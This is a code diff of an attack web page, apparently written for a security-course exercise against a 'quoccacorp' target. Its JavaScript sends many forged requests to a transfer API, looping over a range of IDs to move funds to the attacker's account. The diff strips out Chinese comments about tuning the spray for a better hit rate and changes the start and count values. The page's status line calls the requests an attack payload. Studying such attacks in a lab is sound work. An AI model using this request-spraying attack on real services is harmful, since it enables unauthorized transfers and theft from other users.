@@ -9,14 +9,9 @@
     <ul id="log"></ul>
 
     <script>
-        // 已经修改为你自己的账号
         const ME = "z5678452"; 
-        
-        // 基于你之前查到的 6976，预留一些别人刷新带来的缓冲量
-        const START = 7100; 
-        
-        // 稍微加大了喷洒数量，覆盖更广，提高命中率
-        const COUNT = 1000;  
+        const START = 8159; 
+        const COUNT = 500;  
         const AMOUNT = 1;
         const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";
 
@@ -50,7 +45,6 @@
                     logList.appendChild(li);
                 }
 
-                // 保持原样 50ms 延迟
                 await new Promise(r => setTimeout(r, 50)); 
             }
             statusDiv.innerText = "攻击负载已全部发出。";
